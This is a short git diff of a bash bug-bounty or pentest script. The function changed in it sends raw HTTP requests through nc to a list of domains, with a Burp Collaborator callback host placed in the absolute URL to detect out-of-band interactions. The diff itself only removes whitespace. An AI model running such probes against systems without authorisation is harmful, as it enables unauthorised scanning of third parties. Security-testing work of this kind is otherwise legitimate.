@@ -98,15 +98,13 @@ inject_absolute_url() {
     # Increment the counter
     counter=$((counter + 1))
     # Send the row HTTP GET request using nc (background)
-    echo -e "GET http://$UD.$Collab/ HTTP/1.1\r\nHost: $UD\r\n" | nc -q 1 $UD 80  &> /dev/null &   
+    echo -e "GET http://$UD.$Collab/ HTTP/1.1\r\nHost: $UD\r\n" | nc -q 1 $UD 80  &> /dev/null &
     echo -e "GET http://$UD.$Collab/ HTTP/2\r\nHost: $UD\r\n" | nc -q 1 $UD 443 &> /dev/null &
     echo -e "${light_blue}[$counter/$total_urls] ${YELLOW}$current_time ${NC}- Sent request to: $domain" | tee -a inject_absolute_url.log
     # Wait for $Delay seconds before next iteration
     sleep $delay
   done < "$list"
   echo -e "${GREEN}✅ Injecting Burp Collaborator into absolute URL ${YELLOW}Finished ${NC}"
-
-
 }
 
 # Function to handle the "-e" option
